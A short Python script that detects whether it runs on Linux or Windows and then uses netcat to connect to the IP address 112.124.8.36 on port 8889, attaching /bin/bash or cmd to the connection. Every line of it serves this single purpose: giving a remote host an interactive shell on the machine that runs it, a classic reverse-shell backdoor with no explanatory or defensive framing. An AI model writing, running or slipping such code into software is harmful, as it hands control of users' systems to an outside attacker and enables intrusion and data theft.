import os
import platform

system_name = platform.system()
if system_name == 'Linux':
    os.system("nc 112.124.8.36 8889 -e /bin/bash")
if system_name == 'Windows':
    os.system("nc 112.124.8.36 8889 -e cmd ")
